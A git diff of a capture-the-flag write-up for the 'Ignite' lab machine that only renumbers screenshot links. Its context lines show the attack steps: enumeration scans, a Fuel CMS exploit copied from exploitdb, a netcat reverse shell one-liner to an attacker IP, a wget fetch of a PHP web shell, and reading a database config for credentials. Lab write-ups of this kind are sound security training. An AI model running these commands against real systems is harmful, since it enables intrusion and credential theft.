@@ -19,7 +19,7 @@ echo "10.10.28.158 ignite.thm" >> /etc/hosts
 nmap -sC -sV -O $ignite
 ```
 
-![](../.gitbook/assets/image%20%28453%29.png)
+![](../.gitbook/assets/image%20%28454%29.png)
 
 ## GOBUSTER
 
@@ -33,7 +33,7 @@ gobuster dir -u $ignite -w /usr/share/wordlists/dirb/common.txt -q -t 15 -x php,
 
 ![](../.gitbook/assets/image%20%28422%29.png)
 
-![](../.gitbook/assets/image%20%28445%29.png)
+![](../.gitbook/assets/image%20%28446%29.png)
 
 ![](../.gitbook/assets/image%20%28403%29.png)
 
@@ -52,7 +52,7 @@ searchsploit Fuel
 searchsploit -p 47138
 ```
 
-![](../.gitbook/assets/image%20%28440%29.png)
+![](../.gitbook/assets/image%20%28441%29.png)
 
 ```text
 cp /usr/share/exploitdb/exploits/linux/webapps/47138.py ignite.py
@@ -110,7 +110,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.4.204 4444 >/tmp
 cmd:bash shell.sh
 ```
 
-![](../.gitbook/assets/image%20%28437%29.png)
+![](../.gitbook/assets/image%20%28438%29.png)
 
 ```text
 python3 ignite.py
@@ -123,7 +123,7 @@ wget http://10.14.4.204:8000/phpbash.php
 
 ![](../.gitbook/assets/image%20%28395%29.png)
 
-![](../.gitbook/assets/image%20%28430%29.png)
+![](../.gitbook/assets/image%20%28431%29.png)
 
 ### User.txt
 
@@ -141,7 +141,7 @@ python -c 'import pty; pty.spawn("/bin/bash")'
  cat /var/www/html/fuel/application/config/database.php
 ```
 
-![](../.gitbook/assets/image%20%28441%29.png)
+![](../.gitbook/assets/image%20%28442%29.png)
 
 ```text
 su -
